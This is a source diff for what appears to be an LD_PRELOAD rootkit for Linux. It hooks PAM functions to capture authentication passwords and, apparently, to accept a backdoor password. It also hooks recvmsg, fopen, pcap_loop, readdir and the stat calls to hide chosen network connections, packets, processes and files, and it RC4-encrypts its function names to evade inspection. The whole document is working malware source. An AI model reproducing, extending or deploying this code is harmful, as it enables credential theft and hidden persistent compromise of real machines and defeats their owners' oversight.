@@ -1,5 +1,7 @@
+#define _GNU_SOURCE
 #include <dlfcn.h>
 #include <errno.h>
+#include <fcntl.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -12,12 +14,27 @@
 #include "rc4.h"
 #include "utils.h"
 
+char *pampassword;
+
+fstatat_fn orig_fstatat_6408;
+pam_acct_mgmt_fn orig_pam_acct_mgmt_5696;
+pam_authenticate_fn orig_pam_authenticate_5729;
+execve_fn orig_execve;
+fopen64_fn orig_fopen64_6604;
+stat_fn orig_stat_6491;
+read_fn orig_read;
+fopen_fn orig_fopen_6630;
+recvmsg_fn orig_recvmsg_6760;
+pam_set_item_fn orig_pam_set_item_5667;
+statx_fn orig_statx_6467;
+fstatat64_fn orig_fstatat_6436;
+readdir_fn orig_readdir_6135;
+readdir64_fn orig_readdir64_6171;
+
 #define FSTATAT_ENC "\x31\xA5\x8E\x54\xE1\x4D\x93"
 
 int fstatat (int fd, const char *restrict path,
              struct stat *restrict buf, int flag) {
-  typedef int (*fstatat_fn)(int, const char *, struct stat *, int);
-  static fstatat_fn orig_fstatat_6408;
   char fstatat_str[8];
 
   if (!orig_fstatat_6408) {
@@ -38,8 +55,6 @@ int fstatat (int fd, const char *restrict path,
                       "\xFC\x78"
 
 int pam_acct_mgmt(pam_handle_t *pamh, int flags) {
-  typedef int (*pam_acct_mgmt_fn)(pam_handle_t *, int);
-  static pam_acct_mgmt_fn orig_pam_acct_mgmt_5696;
   char pam_enc[14];
   char caixapass[14];
 
@@ -68,8 +83,6 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags) {
 #define ETC_MPT64_ENC "\x78\xB3\x8E\x56\xBA\x41\x97\xC2\xF3\x7B\x08\xFB"
 
 int pam_authenticate(pam_handle_t *pamh, int flags) {
-  typedef int (*pam_authenticate_fn)(pam_handle_t *, int);
-  static pam_authenticate_fn orig_pam_authenticate_5729;
   char s[1024];
   char pam_auth[17];
   char caixapass[14];
@@ -118,9 +131,7 @@ int pam_authenticate(pam_handle_t *pamh, int flags) {
                      "\x57\x10\x2C\x30\xF9\x77\xB0\x91\x4B\x77\x08"
 
 int execve(const char *pathname, char *const _Nullable argv[],
-                   char *const _Nullable envp[]) {
-  typedef int (*execve_fn)(const char *, char *const[], char *const[]);
-  static execve_fn orig_execve;
+           char *const _Nullable envp[]) {
   char execve_str[7];
   char ld_trace[24];
 
@@ -141,8 +152,6 @@ int execve(const char *pathname, char *const _Nullable argv[],
                          "\x60\x52\xF0\x63"
 
 FILE *fopen64(const char *pathname, const char *mode) {
-  typedef FILE* (*fopen64_fn)(const char *, const char *);
-  static fopen64_fn orig_fopen64_6604;
   char fopen64_str[8];
   char proc_net_tcp[14];
   FILE *f;
@@ -168,8 +177,6 @@ FILE *fopen64(const char *pathname, const char *mode) {
 
 int stat(const char *restrict pathname,
                  struct stat *restrict statbuf) {
-  typedef int (*stat_fn)(const char *restrict, struct stat *restrict);
-  static stat_fn orig_stat_6491;
   char stat_str[5];
 
   if (!orig_stat_6491) {
@@ -189,8 +196,6 @@ int stat(const char *restrict pathname,
 #define READ_ENC "\x25\xB3\x9B\x51"
 
 ssize_t read(int fd, void *buf, size_t count) {
-  typedef ssize_t (*read_fn)(int, void *, size_t);
-  static read_fn orig_read;
   char read_str[5];
   ssize_t res = -1;
 
@@ -218,7 +223,6 @@ ssize_t read(int fd, void *buf, size_t count) {
 #define PCAP_STATS_ENC "\x27\xB5\x9B\x45\xCA\x5F\x93\xD7\xB1\x3C"
 
 int pcap_stats(pcap_t *p, struct pcap_stat *ps) {
-  typedef int (*pcap_stats_fn)(pcap_t *, struct pcap_stat *);
   char pcap_stats_str[11];
   pcap_stats_fn orig_pcap_stats;
   int res;
@@ -253,17 +257,244 @@ int setsockopt(int socket, int level, int option_name,
   return res;
 }
 
+#define FOPEN_ENC "\x31\xB9\x8A\x50\xFB"
+#define UNK_ENC ""
+
 FILE *fopen(const char *restrict pathname,
-                    const char *restrict mode);
-ssize_t recvmsg(int socket, struct msghdr *message, int flags);
-int pam_set_item(pam_handle_t *pamh, int item_type,
-                         const void *item);
-int statx(int dirfd, const char *_Nullable restrict pathname,
-                  int flags, unsigned int mask,
-                  struct statx *restrict statxbuf);
-int fstatat64(int dirfd, const char *pathname,
-                      struct stat64 *statbuf, int flags);
-int pcap_loop(pcap_t *p, int cnt,
-                      pcap_handler callback, u_char *user);
-struct dirent *readdir(DIR *dirp);
-struct dirent64 *readdir64(DIR *dirp);
+            const char *restrict mode) {
+  char fopen_str[6];
+  char proc_net_tcp[14];
+  FILE *res;
+
+  if (!orig_fopen_6630) {
+    // "fopen"
+    strcpy(fopen_str, FOPEN_ENC);
+    orig_fopen_6630 = dlsym(RTLD_NEXT, rc4(key, fopen_str, 5));
+  }
+
+  res = orig_fopen_6630(pathname, mode);
+  if (!res)
+    return res;
+
+  // "/proc/net/tcp"
+  strcpy(proc_net_tcp, PROC_NET_TCP_ENC);
+  // if contains "/proc/net/tcp"
+  if (strstr(pathname, rc4(key, proc_net_tcp, 13))) {
+    return hide_proc_net_connection(res);
+  }
+
+  return res;
+}
+
+#define RECVMSG_ENC "\x25\xB3\x99\x43\xF8\x5F\x80"
+
+ssize_t recvmsg(int socket, struct msghdr *message, int flags) {
+  char recvmsg_str[8];
+  ssize_t res;
+  int i;
+  struct sockaddr_in *sockaddr;
+  struct iovec *msg_iov;
+  struct protocol_struct *proto;
+  size_t res_len;
+
+  if (!orig_recvmsg_6760) {
+    strcpy(recvmsg_str, RECVMSG_ENC);
+    orig_recvmsg_6760 = dlsym(RTLD_NEXT, rc4(key, recvmsg_str, 7));
+  }
+
+  res = orig_recvmsg_6760(socket, message, flags);
+  if (res < 16 || !message->msg_name || message->msg_namelen != 12) {
+    return res;
+  }
+
+  sockaddr = message->msg_name;
+  if (sockaddr->sin_family != AF_NETLINK)
+    return res;
+
+  msg_iov = message->msg_iov;
+  if (!msg_iov || !msg_iov[0].iov_base)
+    return res;
+
+  res_len = res;
+  proto = msg_iov[0].iov_base;
+  while (res_len > 15 && proto->len > 15 && proto->len <= res_len
+         && proto->unk1 == 20) {
+    struct net_data *ndata = &proto->ndata;
+    if (proto->len < 72) {
+      res_len -= (proto->len + 3) & 0xFFFFFFFC;
+      proto = (struct protocol_struct *)((char *)proto +
+                                         ((proto->len + 3) & 0xFFFFFFFC));
+      continue;
+    }
+    if (ndata->sa_family == AF_INET || ndata->sa_family == AF_INET6) {
+      int should_hide = 0;
+      for (i = 0; hidden_ports[i] != 0; i++) {
+        if (htons(ndata->port1) != hidden_ports[i]) {
+          if (htons(ndata->port2) != hidden_ports[i])
+            continue;
+        }
+        should_hide = 1;
+        break;
+      }
+      if (!should_hide) {
+        for (i = 0; hidden_address[i] != -1; i++) {
+          if (htonl(hidden_address[i]) != ndata->ip2) {
+            if (htonl(hidden_address[i]) != ndata->ip1)
+              continue;
+          }
+          should_hide = 1;
+          break;
+        }
+      }
+      if (!should_hide) {
+        res_len -= (proto->len + 3) & 0xFFFFFFFC;
+        proto = (struct protocol_struct *)((char *)proto +
+                                           ((proto->len + 3) & 0xFFFFFFFC));
+        continue;
+      }
+      res -= proto->len;
+      memcpy(proto, (char *)proto + proto->len, res_len - proto->len);
+      res_len -= proto->len;
+    }
+    // if (ndata->sa_family == AF_INET || ndata->sa_family == AF_INET6)
+    else {
+      res_len -= (proto->len + 3) & 0xFFFFFFFC;
+        proto = (struct protocol_struct *)((char *)proto +
+                                           ((proto->len + 3) & 0xFFFFFFFC));
+    }
+  }
+  if (!res) {
+    res = 32;
+    proto = msg_iov[0].iov_base;
+    proto->len = 32;
+    proto->unk1 = 3;
+  }
+
+  return res;
+}
+
+#define PAM_SET_ITEM_ENC "\x27\xB7\x97\x6A\xE6\x49\x93\xE9\xAC\x3B\x43\xFE"
+
+int pam_set_item(pam_handle_t *pamh, int item_type, const void *item) {
+  char pam_set_item_str[13];
+  int res;
+
+  if (!orig_pam_set_item_5667) {
+    // "pam_set_item"
+    strcpy(pam_set_item_str, PAM_SET_ITEM_ENC);
+    orig_pam_set_item_5667 = dlsym(RTLD_NEXT, rc4(key, pam_set_item_str, 12));
+  }
+
+  res = orig_pam_set_item_5667(pamh, item_type, item);
+  if (item_type == PAM_AUTHTOK && item != NULL) {
+    if (pampassword) {
+      erasefree(pampassword);
+      pampassword = NULL;
+    }
+    pampassword = strdup(item);
+  }
+
+  return res;
+}
+
+#define STATX_ENC "\x24\xA2\x9B\x41\xED"
+
+int statx(int dirfd, const char *restrict pathname, int flags,
+          unsigned int mask, struct statx *restrict statxbuf) {
+  char statx_str[6];
+
+  if (!orig_statx_6467) {
+    // "statx"
+    strcpy(statx_str, STATX_ENC);
+    orig_statx_6467 = dlsym(RTLD_NEXT, rc4(key, statx_str, 5));
+  }
+
+  if (dirfd != -100 || !must_hide(pathname))
+    return orig_statx_6467(dirfd, pathname, flags, mask, statxbuf);
+
+  errno = ENOENT;
+  return -1;
+}
+
+#define FSTATAT64_ENC "\x31\xA5\x8E\x54\xE1\x4D\x93\x80\xF1"
+
+int fstatat64(int dirfd, const char *pathname, struct stat64 *statbuf,
+              int flags) {
+  char fstatat64_str[10];
+
+  if (!orig_fstatat_6436) {
+    // "fstatat64"
+    strcpy(fstatat64_str, FSTATAT64_ENC);
+    orig_fstatat_6436 = dlsym(RTLD_NEXT, rc4(key, fstatat64_str, 9));
+  }
+
+  if (dirfd != -100 || !must_hide(pathname))
+    return orig_fstatat_6436(dirfd, pathname, statbuf, flags);
+
+  errno = ENOENT;
+  return -1;
+}
+
+void *orig_loop;
+#define PCAP_LOOP_FN "\x27\xB5\x9B\x45\xCA\x40\x88\xD9\xB5"
+
+int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
+  char pcap_loop_str[10];
+  pcap_loop_fn original;
+
+  // "pcap_loop"
+  strcpy(pcap_loop_str, PCAP_LOOP_FN);
+  original = dlsym(RTLD_NEXT, rc4(key, pcap_loop_str, 9));
+  orig_loop = (void *)callback;
+  return original(p, cnt, check_pkt, user);
+}
+
+#define READDIR_ENC "\x25\xB3\x9B\x51\xF1\x45\x95"
+
+struct dirent *readdir(DIR *dirp) {
+  char readdir_str[8];
+  struct dirent *res;
+
+  if (!orig_readdir_6135) {
+    // "readdir"
+    strcpy(readdir_str, READDIR_ENC);
+    orig_readdir_6135 = dlsym(RTLD_NEXT, rc4(key, readdir_str, 7));
+  }
+
+  res = NULL;
+  if (check_proc(dirp)) {
+    do {
+      res = orig_readdir_6135(dirp);
+    } while (res && !hidden_proc(res->d_name));
+    return res;
+  }
+  do {
+    res = orig_readdir_6135(dirp);
+  } while (res && !hidden_file(res->d_name));
+  return res;
+}
+
+#define READDIR64_ENC "\x25\xB3\x9B\x51\xF1\x45\x95\x80\xF1"
+
+struct dirent64 *readdir64(DIR *dirp) {
+  char readdir64_str[10];
+  struct dirent64 *res;
+
+  if (!orig_readdir64_6171) {
+    // "readdir64"
+    strcpy(readdir64_str, READDIR64_ENC);
+    orig_readdir64_6171 = dlsym(RTLD_NEXT, rc4(key, readdir64_str, 9));
+  }
+
+  res = NULL;
+  if (check_proc(dirp)) {
+    do {
+      res = orig_readdir64_6171(dirp);
+    } while (res && !hidden_proc(res->d_name));
+    return res;
+  }
+  do {
+    res = orig_readdir64_6171(dirp);
+  } while (res && !hidden_file(res->d_name));
+  return res;
+}
